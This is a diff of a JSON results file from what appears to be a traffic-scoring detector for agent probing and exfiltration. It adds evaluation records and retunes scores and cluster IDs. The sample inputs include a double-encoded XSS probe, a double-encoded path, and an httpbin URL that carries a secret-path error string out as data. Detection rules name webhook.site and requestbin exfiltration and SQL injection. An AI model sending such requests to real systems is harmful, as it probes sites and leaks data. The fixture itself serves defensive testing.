-      "score": 15,
+      "score": 13,
       "tier": "significant",
       "hits": [
         {
@@ -5816,7 +6200,7 @@
       "features": [
         "exfil.requestbin:c0ve7x9.m.pipedream.net"
       ],
-      "cluster": 17
+      "cluster": 13
     },
     {
       "obs": {
@@ -5857,7 +6241,7 @@
       "features": [
         "param:uqtag=covrun7"
       ],
-      "cluster": 16
+      "cluster": 12
     },
     {
       "obs": {
@@ -5961,7 +6345,7 @@
           "via": "1.1 hysandbox-ats (ApacheTrafficServer/9.2)"
         }
       },
-      "score": 5,
+      "score": 2,
       "tier": "significant",
       "hits": [
         {
@@ -6005,8 +6389,8 @@
           "via": "1.1 edge (ApacheTrafficServer/9.2)"
         }
       },
-      "score": 8,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6067,7 +6451,7 @@
       "features": [
         "param:uqtag=covrun9"
       ],
-      "cluster": 18
+      "cluster": 26
     },
     {
       "obs": {
@@ -6153,7 +6537,7 @@
       "features": [
         "param:uqtag=covrun9"
       ],
-      "cluster": 18
+      "cluster": 26
     },
     {
       "obs": {
@@ -6164,8 +6548,8 @@
         "user_agent": "Playwright/1.48",
         "final_url": "about:neterror?e=dnsNotFound"
       },
-      "score": 7,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6218,7 +6602,7 @@
       "features": [
         "param:uqtag=covrun9"
       ],
-      "cluster": 18
+      "cluster": 26
     },
     {
       "obs": {
@@ -6358,6 +6742,267 @@
     },
     {
       "obs": {
+        "id": "eval:cov-double-encoded",
+        "source": "eval",
+        "ts": 1786352400,
+        "url": "https://records.agency.example/api/Rep%2561ort?id=9&uqtag=covrun10"
+      },
+      "score": 7,
+      "tier": "significant",
+      "hits": [
+        {
+          "rule_id": "exploit.double_encoded_path",
+          "kind": "exploit",
+          "weight": 4,
+          "matched": "/Rep%61",
+          "layer": 0,
+          "tactic": "T4"
+        },
+        {
+          "rule_id": "marker.uq_tags",
+          "kind": "agent_marker",
+          "weight": 3,
+          "matched": "uqtag=covrun10",
+          "layer": 0,
+          "artifact": true
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "records.agency.example",
+          "text": "https://records.agency.example/api/Rep%61ort?id=9&uqtag=covrun10"
+        }
+      ],
+      "target_host": "records.agency.example",
+      "features": [
+        "param:uqtag=covrun10"
+      ],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:cov-httpbin-exfil",
+        "source": "eval",
+        "ts": 1786352700,
+        "url": "https://httpbin.org/get?e=Error%3A%20could%20not%20read%20https%3A%2F%2Frecords.agency.example%2Fapi%2Fsecret%2Fvalues%2Flist"
+      },
+      "score": 5,
+      "tier": "significant",
+      "hits": [
+        {
+          "rule_id": "carrier.httpbin",
+          "kind": "carrier",
+          "weight": 2,
+          "matched": "httpbin.org",
+          "layer": 0,
+          "tactic": "T2"
+        },
+        {
+          "rule_id": "exfil.httpbin_data",
+          "kind": "exfil",
+          "weight": 3,
+          "matched": "httpbin.org/get?e=Error: could not read https://records.agency.example/api/secret/values/list",
+          "layer": 0,
+          "tactic": "T7"
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "httpbin.org",
+          "text": "https://httpbin.org/get?e=Error: could not read https://records.agency.example/api/secret/values/list"
+        }
+      ],
+      "target_host": null,
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:cov-oai-prefix",
+        "source": "eval",
+        "ts": 1786353000,
+        "url": "https://records.agency.example/datamart/Facts?tok=OAI_META_1312&$select=Year"
+      },
+      "score": 3,
+      "tier": "suggestive",
+      "hits": [
+        {
+          "rule_id": "marker.oai_prefix",
+          "kind": "agent_marker",
+          "weight": 3,
+          "matched": "OAI_META_1312",
+          "layer": 0,
+          "artifact": true
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "records.agency.example",
+          "text": "https://records.agency.example/datamart/Facts?tok=OAI_META_1312&$select=Year"
+        }
+      ],
+      "target_host": "records.agency.example",
+      "features": [
+        "param:tok=OAI_META_1312"
+      ],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:cov-signature-agent",
+        "source": "eval",
+        "ts": 1786353300,
+        "url": "https://records.agency.example/api/items?page=4",
+        "user_agent": "Mozilla/5.0 (compatible; ExampleAgent/1.0)",
+        "headers": {
+          "signature-agent": "https://agent.example/.well-known/http-message-signatures-directory",
+          "signature-input": "sig1=(\"@authority\");created=1760000000;keyid=\"k1\""
+        }
+      },
+      "score": 1,
+      "tier": "noise",
+      "hits": [
+        {
+          "rule_id": "selfid.signature_agent",
+          "kind": "self_id",
+          "weight": 1,
+          "matched": "signature-agent: https://agent.example/.well-known/http-message-signatures-directory",
+          "layer": 0,
+          "artifact": true
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "records.agency.example",
+          "text": "https://records.agency.example/api/items?page=4"
+        }
+      ],
+      "target_host": "records.agency.example",
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:cov-agent-ua",
+        "source": "eval",
+        "ts": 1786353600,
+        "url": "https://records.agency.example/api/items?page=5&uqtag=covrun11",
+        "user_agent": "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot"
+      },
+      "score": 4,
+      "tier": "suggestive",
+      "hits": [
+        {
+          "rule_id": "marker.uq_tags",
+          "kind": "agent_marker",
+          "weight": 3,
+          "matched": "uqtag=covrun11",
+          "layer": 0,
+          "artifact": true
+        },
+        {
+          "rule_id": "header.agent_ua",
+          "kind": "header",
+          "weight": 1,
+          "matched": "ChatGPT-User",
+          "layer": 0,
+          "artifact": true
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "records.agency.example",
+          "text": "https://records.agency.example/api/items?page=5&uqtag=covrun11"
+        }
+      ],
+      "target_host": "records.agency.example",
+      "features": [
+        "param:uqtag=covrun11"
+      ],
+      "cluster": 18
+    },
+    {
+      "obs": {
+        "id": "eval:cov-agent-ua-benign",
+        "source": "eval",
+        "ts": 1786353900,
+        "url": "https://www.news.example/article/9",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36"
+      },
+      "score": 0,
+      "tier": "noise",
+      "hits": [],
+      "target_host": "www.news.example",
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:cov-double-meta",
+        "source": "eval",
+        "ts": 1786354200,
+        "url": "https://records.agency.example/find?IdNumber=%253Cscript%253E&uqtag=covrun12"
+      },
+      "score": 7,
+      "tier": "significant",
+      "hits": [
+        {
+          "rule_id": "exploit.double_encoded_meta",
+          "kind": "exploit",
+          "weight": 4,
+          "matched": "IdNumber=%3C",
+          "layer": 0,
+          "tactic": "T4"
+        },
+        {
+          "rule_id": "marker.uq_tags",
+          "kind": "agent_marker",
+          "weight": 3,
+          "matched": "uqtag=covrun12",
+          "layer": 0,
+          "artifact": true
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "records.agency.example",
+          "text": "https://records.agency.example/find?IdNumber=%3Cscript%3E&uqtag=covrun12"
+        }
+      ],
+      "target_host": "records.agency.example",
+      "features": [
+        "param:uqtag=covrun12"
+      ],
+      "cluster": 18
+    },
+    {
+      "obs": {
+        "id": "eval:cov-double-meta-benign",
+        "source": "eval",
+        "ts": 1786354500,
+        "url": "https://shop.example/catalog?note=was%252050%2525%2520off"
+      },
+      "score": 0,
+      "tier": "noise",
+      "hits": [],
+      "target_host": "shop.example",
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
         "id": "eval:swarm-shard-00",
         "source": "eval",
         "ts": 1772445600,
@@ -6365,8 +7010,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6411,7 +7056,7 @@
       "features": [
         "param:uqtag=shardA7"
       ],
-      "cluster": 0
+      "cluster": 22
     },
     {
       "obs": {
@@ -6422,8 +7067,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6468,7 +7113,7 @@
       "features": [
         "param:uqtag=shardA7"
       ],
-      "cluster": 0
+      "cluster": 22
     },
     {
       "obs": {
@@ -6479,8 +7124,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6525,7 +7170,7 @@
       "features": [
         "param:uqtag=shardA7"
       ],
-      "cluster": 0
+      "cluster": 22
     },
     {
       "obs": {
@@ -6536,8 +7181,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6582,7 +7227,7 @@
       "features": [
         "param:uqtag=shardA7"
       ],
-      "cluster": 0
+      "cluster": 22
     },
     {
       "obs": {
@@ -6593,8 +7238,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6639,7 +7284,7 @@
       "features": [
         "param:uqtag=shardA7"
       ],
-      "cluster": 0
+      "cluster": 22
     },
     {
       "obs": {
@@ -6650,8 +7295,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6696,7 +7341,7 @@
       "features": [
         "param:uqtag=shardA7"
       ],
-      "cluster": 0
+      "cluster": 22
     },
     {
       "obs": {
@@ -6707,8 +7352,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6753,7 +7398,7 @@
       "features": [
         "param:uqtag=shardA7"
       ],
-      "cluster": 0
+      "cluster": 22
     },
     {
       "obs": {
@@ -6764,8 +7409,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6810,7 +7455,7 @@
       "features": [
         "param:uqtag=shardA7"
       ],
-      "cluster": 0
+      "cluster": 22
     },
     {
       "obs": {
@@ -6821,8 +7466,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6867,7 +7512,7 @@
       "features": [
         "param:uqtag=shardB7"
       ],
-      "cluster": 1
+      "cluster": 23
     },
     {
       "obs": {
@@ -6878,8 +7523,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6924,7 +7569,7 @@
       "features": [
         "param:uqtag=shardB7"
       ],
-      "cluster": 1
+      "cluster": 23
     },
     {
       "obs": {
@@ -6935,8 +7580,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -6981,7 +7626,7 @@
       "features": [
         "param:uqtag=shardB7"
       ],
-      "cluster": 1
+      "cluster": 23
     },
     {
       "obs": {
@@ -6992,8 +7637,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -7038,7 +7683,7 @@
       "features": [
         "param:uqtag=shardB7"
       ],
-      "cluster": 1
+      "cluster": 23
     },
     {
       "obs": {
@@ -7049,8 +7694,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -7095,7 +7740,7 @@
       "features": [
         "param:uqtag=shardB7"
       ],
-      "cluster": 1
+      "cluster": 23
     },
     {
       "obs": {
@@ -7106,8 +7751,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -7152,7 +7797,7 @@
       "features": [
         "param:uqtag=shardB7"
       ],
-      "cluster": 1
+      "cluster": 23
     },
     {
       "obs": {
@@ -7163,8 +7808,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -7209,7 +7854,7 @@
       "features": [
         "param:uqtag=shardB7"
       ],
-      "cluster": 1
+      "cluster": 23
     },
     {
       "obs": {
@@ -7220,8 +7865,8 @@
         "asn": 16509,
         "user_agent": "SchedRunner/3.2"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -7266,7 +7911,7 @@
       "features": [
         "param:uqtag=shardB7"
       ],
-      "cluster": 1
+      "cluster": 23
     },
     {
       "obs": {
@@ -7277,8 +7922,8 @@
         "asn": 16509,
         "user_agent": "ScoutAgent/1.0"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -7329,7 +7974,7 @@
       "features": [
         "param:uqtag=scout7f"
       ],
-      "cluster": 12
+      "cluster": 25
     },
     {
       "obs": {
@@ -7340,8 +7985,8 @@
         "asn": 16509,
         "user_agent": "ScoutAgent/1.0"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -7392,7 +8037,7 @@
       "features": [
         "param:uqtag=scout7f"
       ],
-      "cluster": 12
+      "cluster": 25
     },
     {
       "obs": {
@@ -7403,8 +8048,8 @@
         "asn": 16509,
         "user_agent": "ScoutAgent/1.0"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -7455,7 +8100,7 @@
       "features": [
         "param:uqtag=scout7f"
       ],
-      "cluster": 12
+      "cluster": 25
     },
     {
       "obs": {
@@ -7466,8 +8111,8 @@
         "asn": 14061,
         "user_agent": "python-requests/2.31.0"
       },
-      "score": 7,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -7520,7 +8165,7 @@
       "features": [
         "param:uqtag=exec4k"
       ],
-      "cluster": 13
+      "cluster": 10
     },
     {
       "obs": {
@@ -7571,7 +8216,7 @@
       "features": [
         "param:uqtag=exec4k"
       ],
-      "cluster": 13
+      "cluster": 10
     },
     {
       "obs": {
@@ -7622,7 +8267,7 @@
       "features": [
         "param:uqtag=exec4k"
       ],
-      "cluster": 13
+      "cluster": 10
     },
     {
       "obs": {
@@ -7688,7 +8333,7 @@
         "exfil.webhook_site:webhook.site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f",
         "param:uqtag=ag1x"
       ],
-      "cluster": 4
+      "cluster": 2
     },
     {
       "obs": {
@@ -7699,7 +8344,7 @@
         "asn": 14061,
         "user_agent": "python-httpx/0.27.0"
       },
-      "score": 9,
+      "score": 8,
       "tier": "significant",
       "hits": [
         {
@@ -7760,7 +8405,7 @@
         "exfil.webhook_site:webhook.site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f",
         "param:uqtag=ag2y"
       ],
-      "cluster": 4
+      "cluster": 2
     },
     {
       "obs": {
@@ -7826,7 +8471,7 @@
         "exfil.webhook_site:webhook.site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f",
         "param:uqtag=ag1x"
       ],
-      "cluster": 4
+      "cluster": 2
     },
     {
       "obs": {
@@ -7837,7 +8482,7 @@
         "asn": 14061,
         "user_agent": "python-httpx/0.27.0"
       },
-      "score": 9,
+      "score": 8,
       "tier": "significant",
       "hits": [
         {
@@ -7898,7 +8543,7 @@
         "exfil.webhook_site:webhook.site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f",
         "param:uqtag=ag2y"
       ],
-      "cluster": 4
+      "cluster": 2
     },
     {
       "obs": {
@@ -7964,7 +8609,7 @@
         "exfil.webhook_site:webhook.site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f",
         "param:uqtag=ag1x"
       ],
-      "cluster": 4
+      "cluster": 2
     },
     {
       "obs": {
@@ -7975,7 +8620,7 @@
         "asn": 14061,
         "user_agent": "python-httpx/0.27.0"
       },
-      "score": 9,
+      "score": 8,
       "tier": "significant",
       "hits": [
         {
@@ -8036,7 +8681,7 @@
         "exfil.webhook_site:webhook.site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f",
         "param:uqtag=ag2y"
       ],
-      "cluster": 4
+      "cluster": 2
     },
     {
       "obs": {
@@ -8047,8 +8692,8 @@
         "asn": 16509,
         "user_agent": "MapperAgent/0.9"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -8093,7 +8738,7 @@
       "features": [
         "param:uqtag=map31z"
       ],
-      "cluster": 6
+      "cluster": 24
     },
     {
       "obs": {
@@ -8104,8 +8749,8 @@
         "asn": 16509,
         "user_agent": "MapperAgent/0.9"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -8150,7 +8795,7 @@
       "features": [
         "param:uqtag=map31z"
       ],
-      "cluster": 6
+      "cluster": 24
     },
     {
       "obs": {
@@ -8161,8 +8806,8 @@
         "asn": 16509,
         "user_agent": "MapperAgent/0.9"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -8207,7 +8852,7 @@
       "features": [
         "param:uqtag=map31z"
       ],
-      "cluster": 6
+      "cluster": 24
     },
     {
       "obs": {
@@ -8218,8 +8863,8 @@
         "asn": 16509,
         "user_agent": "MapperAgent/0.9"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -8264,7 +8909,7 @@
       "features": [
         "param:uqtag=map31z"
       ],
-      "cluster": 6
+      "cluster": 24
     },
     {
       "obs": {
@@ -8275,8 +8920,8 @@
         "asn": 16509,
         "user_agent": "MapperAgent/0.9"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -8321,7 +8966,7 @@
       "features": [
         "param:uqtag=map31z"
       ],
-      "cluster": 6
+      "cluster": 24
     },
     {
       "obs": {
@@ -8372,7 +9017,7 @@
       "features": [
         "param:uqtag=hit88q"
       ],
-      "cluster": 7
+      "cluster": 4
     },
     {
       "obs": {
@@ -8423,7 +9068,7 @@
       "features": [
         "param:uqtag=hit88q"
       ],
-      "cluster": 7
+      "cluster": 4
     },
     {
       "obs": {
@@ -8474,7 +9119,7 @@
       "features": [
         "param:uqtag=hit88q"
       ],
-      "cluster": 7
+      "cluster": 4
     },
     {
       "obs": {
@@ -8525,7 +9170,7 @@
       "features": [
         "param:uqtag=hit88q"
       ],
-      "cluster": 7
+      "cluster": 4
     },
     {
       "obs": {
@@ -8576,296 +9221,12 @@
       "features": [
         "param:uqtag=hit88q"
       ],
-      "cluster": 7
+      "cluster": 4
     }
   ],
   "clusters": [
     {
       "id": "C1",
-      "key": "k-b000dccb",
-      "members": [
-        193,
-        194,
-        195,
-        196,
-        197,
-        198,
-        199,
-        200
-      ],
-      "start": 1772445600,
-      "end": 1772445950,
-      "tier": "significant",
-      "score": 6,
-      "rules": {
-        "cache.buster": 8,
-        "marker.uq_tags": 8,
-        "relay.jina": 8
-      },
-      "kinds": {
-        "relay": 8,
-        "agent_marker": 8,
-        "cache_buster": 8
-      },
-      "tactics": {
-        "T1": 16
-      },
-      "artifacts": 8,
-      "target_hosts": {
-        "h0.county-records.example": 1,
-        "h1.county-records.example": 1,
-        "h2.county-records.example": 1,
-        "h3.county-records.example": 1,
-        "h4.county-records.example": 1,
-        "h5.county-records.example": 1,
-        "h6.county-records.example": 1,
-        "h7.county-records.example": 1
-      },
-      "asns": {
-        "16509": 8
-      },
-      "user_agents": {
-        "SchedRunner/3.2": 8
-      },
-      "encodings": {},
-      "fanout": {
-        "batches": 8,
-        "widths": {
-          "1": 8
-        },
-        "modal_share": 1.0
-      },
-      "relay_stacks": {
-        "relay.jina → target": 8
-      },
-      "link_features": [
-        "param:uqtag=shardA7"
-      ],
-      "runs": [
-        {
-          "start": 1772445600,
-          "end": 1772445950,
-          "count": 8
-        }
-      ],
-      "timing": {
-        "count": 8,
-        "start": 1772445600,
-        "end": 1772445950,
-        "median_gap_secs": 50.0,
-        "p90_gap_secs": 50.0,
-        "bursts": [],
-        "pauses": [],
-        "hourly": [
-          [
-            1772445600,
-            8
-          ]
-        ],
-        "rhythm": {
-          "hours": [
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            1,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ],
-          "entropy": -0.0,
-          "longest_idle_hours": 0.013888888888888888,
-          "days": 1,
-          "verdict": {
-            "kind": "too_short"
-          }
-        },
-        "stale_dates": {
-          "tags": 0,
-          "behind": 0,
-          "ahead": 0,
-          "median_lag_days": null,
-          "modal_date": null,
-          "same_date_share": 0.0,
-          "same_lag_share": 0.0,
-          "consistent": false
-        }
-      },
-      "provenance": {
-        "unknown": 8
-      },
-      "corroboration": "single_source",
-      "agent": {
-        "level": "self_described",
-        "signals": [
-          {
-            "kind": "self_id",
-            "records": 8,
-            "detail": "marker.uq_tags"
-          }
-        ]
-      }
-    },
-    {
-      "id": "C2",
-      "key": "k-1d59194a",
-      "members": [
-        201,
-        202,
-        203,
-        204,
-        205,
-        206,
-        207,
-        208
-      ],
-      "start": 1772445640,
-      "end": 1772445990,
-      "tier": "significant",
-      "score": 6,
-      "rules": {
-        "cache.buster": 8,
-        "marker.uq_tags": 8,
-        "relay.jina": 8
-      },
-      "kinds": {
-        "relay": 8,
-        "agent_marker": 8,
-        "cache_buster": 8
-      },
-      "tactics": {
-        "T1": 16
-      },
-      "artifacts": 8,
-      "target_hosts": {
-        "h10.county-records.example": 1,
-        "h11.county-records.example": 1,
-        "h12.county-records.example": 1,
-        "h13.county-records.example": 1,
-        "h14.county-records.example": 1,
-        "h15.county-records.example": 1,
-        "h8.county-records.example": 1,
-        "h9.county-records.example": 1
-      },
-      "asns": {
-        "16509": 8
-      },
-      "user_agents": {
-        "SchedRunner/3.2": 8
-      },
-      "encodings": {},
-      "fanout": {
-        "batches": 8,
-        "widths": {
-          "1": 8
-        },
-        "modal_share": 1.0
-      },
-      "relay_stacks": {
-        "relay.jina → target": 8
-      },
-      "link_features": [
-        "param:uqtag=shardB7"
-      ],
-      "runs": [
-        {
-          "start": 1772445640,
-          "end": 1772445990,
-          "count": 8
-        }
-      ],
-      "timing": {
-        "count": 8,
-        "start": 1772445640,
-        "end": 1772445990,
-        "median_gap_secs": 50.0,
-        "p90_gap_secs": 50.0,
-        "bursts": [],
-        "pauses": [],
-        "hourly": [
-          [
-            1772445600,
-            8
-          ]
-        ],
-        "rhythm": {
-          "hours": [
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            1,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ],
-          "entropy": -0.0,
-          "longest_idle_hours": 0.013888888888888888,
-          "days": 1,
-          "verdict": {
-            "kind": "too_short"
-          }
-        },
-        "stale_dates": {
-          "tags": 0,
-          "behind": 0,
-          "ahead": 0,
-          "median_lag_days": null,
-          "modal_date": null,
-          "same_date_share": 0.0,
-          "same_lag_share": 0.0,
-          "consistent": false
-        }
-      },
-      "provenance": {
-        "unknown": 8
-      },
-      "corroboration": "single_source",
-      "agent": {
-        "level": "self_described",
-        "signals": [
-          {
-            "kind": "self_id",
-            "records": 8,
-            "detail": "marker.uq_tags"
-          }
-        ]
-      }
-    },
-    {
-      "id": "C3",
       "key": "k-5de32788",
       "members": [
         22,
@@ -8880,7 +9241,7 @@
       "start": 1778882707,
       "end": 1778882716,
       "tier": "significant",
-      "score": 23,
+      "score": 19,
       "rules": {
         "carrier.html_program": 1,
         "exploit.sqli_boolean": 2,
@@ -9050,7 +9411,7 @@
       }
     },
     {
-      "id": "C4",
+      "id": "C2",
       "key": "k-4da1c4fa",
       "members": [
         14,
@@ -9064,7 +9425,7 @@
       "start": 1778728800,
       "end": 1778728804,
       "tier": "significant",
-      "score": 9,
+      "score": 5,
       "rules": {
         "exploit.sqli_boolean": 5,
         "exploit.sqli_union": 2
@@ -9194,20 +9555,20 @@
       }
     },
     {
-      "id": "C5",
+      "id": "C3",
       "key": "k-fd3d4fb8",
       "members": [
-        215,
-        216,
-        217,
-        218,
-        219,
-        220
+        233,
+        234,
+        235,
+        236,
+        237,
+        238
       ],
       "start": 1773046800,
       "end": 1773047100,
       "tier": "significant",
-      "score": 11,
+      "score": 8,
       "rules": {
         "cache.buster": 3,
         "exfil.webhook_site": 6,
@@ -9335,7 +9696,7 @@
       }
     },
     {
-      "id": "C6",
+      "id": "C4",
       "key": "k-34333b1b",
       "members": [
         0,
@@ -9348,7 +9709,7 @@
       "start": 1778508130,
       "end": 1778508455,
       "tier": "significant",
-      "score": 12,
+      "score": 5,
       "rules": {
         "exploit.sqli_boolean": 2,
         "exploit.sqli_quote": 1,
@@ -9481,143 +9842,14 @@
       }
     },
     {
-      "id": "C7",
-      "key": "k-408d9c03",
-      "members": [
-        221,
-        222,
-        223,
-        224,
-        225
-      ],
-      "start": 1773331200,
-      "end": 1773331440,
-      "tier": "significant",
-      "score": 6,
-      "rules": {
-        "cache.buster": 5,
-        "marker.uq_tags": 5,
-        "relay.jina": 5
-      },
-      "kinds": {
-        "relay": 5,
-        "agent_marker": 5,
-        "cache_buster": 5
-      },
-      "tactics": {
-        "T1": 10
-      },
-      "artifacts": 5,
-      "target_hosts": {
-        "account.utility-portal.example": 1,
-        "billing.utility-portal.example": 1,
-        "meter.utility-portal.example": 1,
-        "outage.utility-portal.example": 1,
-        "support.utility-portal.example": 1
-      },
-      "asns": {
-        "16509": 5
-      },
-      "user_agents": {
-        "MapperAgent/0.9": 5
-      },
-      "encodings": {},
-      "relay_stacks": {
-        "relay.jina → target": 5
-      },
-      "link_features": [
-        "param:uqtag=map31z"
-      ],
-      "runs": [
-        {
-          "start": 1773331200,
-          "end": 1773331440,
-          "count": 5
-        }
-      ],
-      "timing": {
-        "count": 5,
-        "start": 1773331200,
-        "end": 1773331440,
-        "median_gap_secs": 60.0,
-        "p90_gap_secs": 60.0,
-        "bursts": [],
-        "pauses": [],
-        "hourly": [
-          [
-            1773331200,
-            5
-          ]
-        ],
-        "rhythm": {
-          "hours": [
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            1,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0
-          ],
-          "entropy": -0.0,
-          "longest_idle_hours": 0.016666666666666666,
-          "days": 1,
-          "verdict": {
-            "kind": "too_short"
-          }
-        },
-        "stale_dates": {
-          "tags": 0,
-          "behind": 0,
-          "ahead": 0,
-          "median_lag_days": null,
-          "modal_date": null,
-          "same_date_share": 0.0,
-          "same_lag_share": 0.0,
-          "consistent": false
-        }
-      },
-      "provenance": {
-        "unknown": 5
-      },
-      "corroboration": "single_source",
-      "agent": {
-        "level": "self_described",
-        "signals": [
-          {
-            "kind": "self_id",
-            "records": 5,
-            "detail": "marker.uq_tags"
-          }
-        ]
-      }
-    },
-    {
-      "id": "C8",
+      "id": "C5",
       "key": "k-a798e7e7",
       "members": [
-        226,
-        227,
-        228,
-        229,
-        230
+        244,
+        245,
+        246,
+        247,
+        248
       ],
       "start": 1773333000,
       "end": 1773333240,
@@ -9748,7 +9980,7 @@
       }
     },
     {
-      "id": "C9",
+      "id": "C6",
       "key": "k-2bd95846",
       "members": [
         30,
@@ -9760,7 +9992,7 @@
       "start": 1778923800,
       "end": 1778923804,
       "tier": "significant",
-      "score": 17,
+      "score": 14,
       "rules": {
         "carrier.html_program": 1,
         "exploit.sqli_boolean": 2,
